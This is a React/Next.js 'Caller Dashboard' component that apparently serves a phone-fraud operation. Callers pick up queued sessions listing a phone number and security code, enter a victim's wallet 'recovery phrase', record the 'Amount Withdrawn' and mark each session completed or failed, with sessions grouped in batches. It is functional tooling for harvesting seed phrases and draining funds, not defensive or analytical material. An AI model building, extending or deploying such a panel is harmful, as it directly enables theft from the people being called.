"use client";
import { useEffect, useState } from "react";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Input } from "@/components/ui/input";
import { toast } from "sonner";
import { User, SecuritySession } from "../../../generated/prisma";
import { formatDistanceToNow } from "date-fns";
import { Phone, Check, RefreshCw, X, Loader2 } from "lucide-react";

import {
  Sheet,
  SheetContent,
  SheetDescription,
  SheetHeader,
  SheetTitle,
} from "@/components/ui/sheet";

interface Props {
  caller: User;
  pendingSessions: (SecuritySession & {
    batch: {
      name: string;
      id: string;
    } | null;
  })[];
  assignedSessions: (SecuritySession & {
    batch: {
      name: string;
      id: string;
    } | null;
  })[];
  activeSession: SecuritySession | null;
}

export default function ClientOnly({
  pendingSessions: initialPendingSessions,
  assignedSessions: initialAssignedSessions,
  activeSession: initialActiveSession,
  caller: initialCaller,
}: Props) {
  // eslint-disable-next-line @typescript-eslint/no-unused-vars
  const [caller, setCaller] = useState<User>(initialCaller);
  const [pendingSessions, setPendingSessions] = useState(
    initialPendingSessions
  );
  const [assignedSessions, setAssignedSessions] = useState(
    initialAssignedSessions
  );
  const [assigningSession, setAssigningSession] = useState(false);
  const [isRefreshing, setIsRefreshing] = useState(false);
  const [recoveryPhrase, setRecoveryPhrase] = useState(
    initialActiveSession?.recoveryPhrase || ""
  );
  const [amountWithdrawn, setAmountWithdrawn] = useState(0);
  const [amountWithdrawnError, setAmountWithdrawnError] = useState("");
  const [updatingRecoveryPhrase, setUpdatingRecoveryPhrase] = useState(false);
  const [updatingStatus, setUpdatingStatus] = useState(false);
  const [activeSession, setActiveSession] = useState<SecuritySession | null>(
    initialActiveSession
  );
  const [openAssignedSessionHistory, setOpenAssignedSessionHistory] =
    useState(false);

  // Poll for updates every 10 seconds
  useEffect(() => {
    if (!activeSession) {
      const interval = setInterval(refreshData, 10000);

      return () => clearInterval(interval);
    }
  }, [activeSession]);

  const refreshData = async () => {
    try {
      setIsRefreshing(true);
      const response = await fetch("/api/caller/sessions");
      const data = await response.json();
      setPendingSessions(data.pendingSessions);
      setAssignedSessions(data.assignedSessions);
      setCaller(data.caller);

      // Update active session if it exists
      const inProgressSession = data.assignedSessions.find(
        (session: SecuritySession) => session.status === "in_progress"
      );
      if (inProgressSession) {
        setActiveSession(inProgressSession);
      } else {
        setActiveSession(null);
      }
    } catch (error) {
      console.error("Error refreshing data:", error);
    } finally {
      setIsRefreshing(false);
    }
  };

  const handleAssignSession = async (sessionId: string) => {
    try {
      setAssigningSession(true);
      const response = await fetch(`/api/caller/sessions/${sessionId}/assign`, {
        method: "POST",
      });

      if (!response.ok) {
        const data = await response.json();
        throw new Error(data.error || "Failed to assign session");
      }

      const updatedSession = await response.json();
      setPendingSessions((prev) =>
        prev.filter((session) => session.id !== sessionId)
      );
      setAssignedSessions((prev) => [updatedSession, ...prev]);
      setActiveSession(updatedSession);
      setRecoveryPhrase(updatedSession.recoveryPhrase || "");
      toast.success("Session assigned successfully");
    } catch (error) {
      console.error("Error assigning session:", error);
      toast.error(
        error instanceof Error ? error.message : "Failed to assign session"
      );
    } finally {
      setAssigningSession(false);
    }
  };

  const handleUpdateRecoveryPhrase = async (sessionId: string) => {
    if (!recoveryPhrase) {
      toast.error("Please enter a recovery phrase");
      return;
    }

    try {
      setUpdatingRecoveryPhrase(true);
      const response = await fetch(
        `/api/caller/sessions/${sessionId}/recovery`,
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({ recoveryPhrase }),
        }
      );

      if (!response.ok) {
        throw new Error("Failed to update recovery phrase");
      }

      const updatedSession = await response.json();
      setAssignedSessions((prev) =>
        prev.map((session) =>
          session.id === sessionId ? updatedSession : session
        )
      );
      setActiveSession(updatedSession);
      setRecoveryPhrase(updatedSession.recoveryPhrase);
      toast.success("Recovery phrase updated successfully");
    } catch (error) {
      console.error("Error updating recovery phrase:", error);
      toast.error("Failed to update recovery phrase");
    } finally {
      setUpdatingRecoveryPhrase(false);
    }
  };

  const handleUpdateStatus = async (
    sessionId: string,
    status: "completed" | "failed"
  ) => {
    if (status === "completed" && amountWithdrawn <= 0) {
      setAmountWithdrawnError("Please enter a valid amount withdrawn");
      return;
    }
    try {
      setUpdatingStatus(true);
      const response = await fetch(`/api/caller/sessions/${sessionId}/status`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          status,
          amountWithdrawn: status === "completed" ? amountWithdrawn : 0,
        }),
      });

      if (!response.ok) {
        throw new Error("Failed to update session status");
      }

      const updatedSession = await response.json();
      setAssignedSessions((prev) =>
        prev.map((session) =>
          session.id === sessionId ? updatedSession : session
        )
      );
      setActiveSession(null);
      toast.success(`Session marked as ${status}`);
      refreshData();
    } catch (error) {
      console.error("Error updating session status:", error);
      toast.error("Failed to update session status");
    } finally {
      setUpdatingStatus(false);
    }
  };

  return (
    <div className="container mx-auto py-8 px-4">
      <div className="flex justify-between flex-wrap items-center mb-6">
        <h1 className="text-2xl font-bold mb-4">Caller Dashboard</h1>
        <div className="flex items-center space-x-4 flex-wrap gap-2">
          <div>
            {/* <p className="text-sm text-gray-500">
              Your Balance:{" "}
              <span className="font-medium text-gray-800">
                {caller.balance.toLocaleString("en-US", {
                  style: "currency",
                  currency: "USD",
                })}
              </span>
            </p> */}
          </div>
          <Button
            variant="outline"
            onClick={refreshData}
            disabled={isRefreshing}
            className="w-full md:w-auto"
          >
            <RefreshCw
              className={`h-4 w-4  mr-2 ${isRefreshing ? "animate-spin" : ""}`}
            />
            Refresh
          </Button>
          <Button
            variant="outline"
            onClick={() => setOpenAssignedSessionHistory(true)}
            className="w-full md:w-auto"
            disabled={isRefreshing}
          >
            <Phone className="h-4 w-4 mr-2 " />
            Assigned Sessions
          </Button>
        </div>
      </div>

      {assigningSession && (
        <div className="flex items-center justify-center mb-4">
          <Loader2 className="h-4 w-4 mr-2 animate-spin" />
          Assigning session...
        </div>
      )}
      {activeSession ? (
        // Active Session View
        <Card>
          <CardHeader>
            <CardTitle>Active Session</CardTitle>
          </CardHeader>
          <CardContent>
            <div className="space-y-4">
              <div className="p-4 border rounded-lg space-y-4">
                <div className="flex justify-between items-start">
                  <div>
                    <p className="font-medium">{activeSession.phoneNumber}</p>
                    <p className="text-sm text-gray-500">
                      Security Code: {activeSession.securityCode}
                    </p>
                    <p className="text-sm text-gray-500">
                      Assigned{" "}
                      {formatDistanceToNow(
                        new Date(activeSession.assignedAt!),
                        {
                          addSuffix: true,
                        }
                      )}
                    </p>
                  </div>
                  <Badge className="bg-blue-100 text-blue-800">
                    In Progress
                  </Badge>
                </div>

                <div className="space-y-4">
                  <div className="flex gap-2">
                    <Input
                      placeholder="Enter recovery phrase..."
                      value={recoveryPhrase}
                      onChange={(e) => setRecoveryPhrase(e.target.value)}
                      disabled={updatingRecoveryPhrase}
                    />
                    <Button
                      size="sm"
                      onClick={() =>
                        handleUpdateRecoveryPhrase(activeSession.id)
                      }
                      disabled={updatingRecoveryPhrase}
                    >
                      {updatingRecoveryPhrase ? (
                        <>
                          <Loader2 className="h-4 w-4 mr-2 animate-spin" />
                          Updating...
                        </>
                      ) : (
                        <>
                          <Check className="h-4 w-4 mr-2" />
                          Update Phrase
                        </>
                      )}
                    </Button>
                  </div>
                  <div className="flex flex-col gap-4 md:flex-row items-end justify-between">
                    <div className="flex-1 flex flex-col gap-2 w-full">
                      <p className="text-sm text-gray-500">Amount Withdrawn</p>
                      <Input
                        placeholder="Amount Withdrawn"
                        type="text"
                        value={amountWithdrawn}
                        onChange={(e) => {
                          const value = e.target.value;
                          if (/^\d*\.?\d*$/.test(value)) {
                            setAmountWithdrawn(Number(value));
                            setAmountWithdrawnError("");
                          } else {
                            setAmountWithdrawnError("Invalid amount");
                          }
                        }}
                        disabled={updatingStatus}
                      />
                      {amountWithdrawnError && (
                        <p className="text-red-500 text-sm">
                          {amountWithdrawnError}
                        </p>
                      )}
                    </div>

                    <div className="flex gap-2 justify-end">
                      <Button
                        variant="outline"
                        onClick={() =>
                          handleUpdateStatus(activeSession.id, "failed")
                        }
                        disabled={updatingStatus}
                      >
                        {updatingStatus ? (
                          <>
                            <Loader2 className="h-4 w-4 mr-2 animate-spin" />
                            Updating...
                          </>
                        ) : (
                          <>
                            <X className="h-4 w-4 mr-2" />
                            Mark as Failed
                          </>
                        )}
                      </Button>
                      <Button
                        onClick={() =>
                          handleUpdateStatus(activeSession.id, "completed")
                        }
                      >
                        {updatingStatus ? (
                          <>
                            <Loader2 className="h-4 w-4 mr-2 animate-spin" />
                            Updating...
                          </>
                        ) : (
                          <>
                            <Check className="h-4 w-4 mr-2" />
                            Mark as Completed
                          </>
                        )}
                      </Button>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </CardContent>
        </Card>
      ) : (
        // Pending Sessions View
        <Card>
          <CardHeader>
            <CardTitle>Available Sessions</CardTitle>
          </CardHeader>
          <CardContent>
            <div className="space-y-4">
              {pendingSessions.length > 0 ? (
                pendingSessions.map((session) => (
                  <div
                    key={session.id}
                    className="p-4 border rounded-lg space-y-2"
                  >
                    <div className="flex justify-between items-start">
                      <div>
                        <p className="font-medium">{session.phoneNumber}</p>
                        <p className="text-sm text-gray-500">
                          Security Code: {session.securityCode}
                        </p>
                        <p className="text-sm text-gray-500">
                          Created{" "}
                          {formatDistanceToNow(new Date(session.createdAt), {
                            addSuffix: true,
                          })}
                        </p>
                      </div>
                      <Button
                        size="sm"
                        onClick={() => handleAssignSession(session.id)}
                        disabled={assigningSession}
                      >
                        <Phone className="h-4 w-4 mr-2" />
                        Take Call
                      </Button>
                    </div>
                  </div>
                ))
              ) : (
                <p className="text-center text-gray-500 py-4">
                  No pending sessions available
                </p>
              )}
            </div>
          </CardContent>
        </Card>
      )}

      <Sheet
        open={openAssignedSessionHistory}
        onOpenChange={setOpenAssignedSessionHistory}
      >
        <SheetContent side="right">
          <SheetHeader>
            <SheetTitle>Assigned Sessions</SheetTitle>
            <SheetDescription>
              View and manage your assigned sessions.
            </SheetDescription>
          </SheetHeader>

          <div className="space-y-4">
            {assignedSessions.length > 0 ? (
              assignedSessions.map((session) => (
                <div
                  key={session.id}
                  className="p-4 border rounded-lg space-y-2"
                >
                  <div className="flex justify-between items-start">
                    <div>
                      <p className="font-medium">{session.phoneNumber}</p>
                      <p className="text-sm text-gray-500">
                        Security Code: {session.securityCode}
                      </p>
                      <p className="text-sm text-gray-500">
                        Assigned{" "}
                        {formatDistanceToNow(session.assignedAt || new Date(), {
                          addSuffix: true,
                        })}
                      </p>

                      <p className="text-sm text-gray-500">
                        Status: {session.status}
                      </p>
                      <p className="text-sm text-gray-500">
                        Batch: {session.batch?.name}
                      </p>
                      <p className="text-sm text-gray-500">
                        Created{" "}
                        {formatDistanceToNow(new Date(session.createdAt), {
                          addSuffix: true,
                        })}
                      </p>
                    </div>
                  </div>
                </div>
              ))
            ) : (
              <p className="text-center text-gray-500 py-4">
                No assigned sessions available
              </p>
            )}
          </div>
        </SheetContent>
      </Sheet>
    </div>
  );
}
